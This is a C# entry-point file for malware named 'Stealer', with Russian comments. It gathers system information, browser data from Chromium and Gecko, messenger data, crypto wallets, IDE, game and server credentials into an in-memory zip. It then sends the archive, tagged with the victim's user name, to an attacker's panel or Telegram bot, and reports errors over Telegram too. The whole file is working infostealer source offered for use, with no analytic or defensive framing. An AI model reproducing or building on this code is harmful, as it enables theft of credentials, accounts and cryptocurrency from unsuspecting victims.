using System;
using System.Threading.Tasks;
using Stealer.Collectors;
using Stealer.Utils;

namespace Stealer
{
    class Program
    {
        static async Task Main(string[] args)
        {
            try
            {
                using (var zip = new InMemoryZip())
                {
                    // Собираем системную информацию
                    SystemInfoCollector.Collect(zip);

                    // Собираем браузеры
                    ChromiumCollector.Collect(zip);

                    GeckoCollector.Collect(zip);

                    // Собираем мессенджеры
                    MessengersCollector.Collect(zip);

                    // Собираем криптокошельки
                    CryptoCollector.Collect(zip);

                    // Собираем IDE
                    IDECollector.Collect(zip);

                    // Собираем игры
                    GamesCollector.Collect(zip);

                    // Собираем серверы
                    ServersCollector.Collect(zip);

                    // Проверяем что собрали
                    if (zip.Count == 0)
                    {
                        Config.Initialize();
                        if (!Config.Delivery.Equals("PANEL", StringComparison.OrdinalIgnoreCase))
                        {
                            await TelegramSender.SendMessageAsync("❌ Stealer: No data found");
                        }
                        return;
                    }

                    // Создаём архив
                    byte[] zipData = zip.ToArray();

                    // Отправляем по выбранному методу
                    Config.Initialize();
                    string fileName = $"Stealer_{Environment.UserName}_{DateTime.Now:yyyy-MM-dd_HH-mm-ss}.zip";
                    bool success = false;

                    if (Config.Delivery.Equals("PANEL", StringComparison.OrdinalIgnoreCase))
                    {
                        success = await PanelSender.SendZipAsync(zipData, fileName);
                    }
                    else
                    {
                        success = await TelegramSender.SendZipAsync(zipData, fileName);
                    }
                }
            }
            catch (Exception ex)
            {
                try
                {
                    Config.Initialize();
                    if (!Config.Delivery.Equals("PANEL", StringComparison.OrdinalIgnoreCase))
                    {
                        await TelegramSender.SendMessageAsync($"❌ Stealer error: {ex.Message}");
                    }
                }
                catch { }
            }

        }
    }
}
